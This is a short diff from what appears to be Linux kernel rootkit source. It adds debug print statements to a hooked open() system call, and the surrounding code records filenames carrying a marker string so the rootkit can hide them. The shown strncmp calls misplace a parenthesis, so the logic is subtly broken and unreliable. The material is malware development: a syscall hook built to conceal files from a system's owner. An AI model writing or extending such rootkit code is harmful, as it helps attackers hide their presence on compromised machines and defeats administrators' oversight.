@@ -129,11 +129,13 @@ asmlinkage long hooked_open(const char __user *filename, int flags, umode_t mode
     //Hide a new type of file
     if(strncmp(filename, INEXISTFILE, strlen(INEXISTFILE) == 0)){
         tmp = filename;
+        printk("hide %s\n", tmp);
         while(*tmp != '%') tmp++;
         if(*tmp == '%'){
             hidfiles[filenum] = tmp;
             filenum++;
         }
+        printk("hide %s\n", tmp);
     } else if(strncmp(filename, INEXISTMONITOR, strlen(INEXISTMONITOR) == 0)){
         tmp = filename;
         while(*tmp != '%') tmp++;
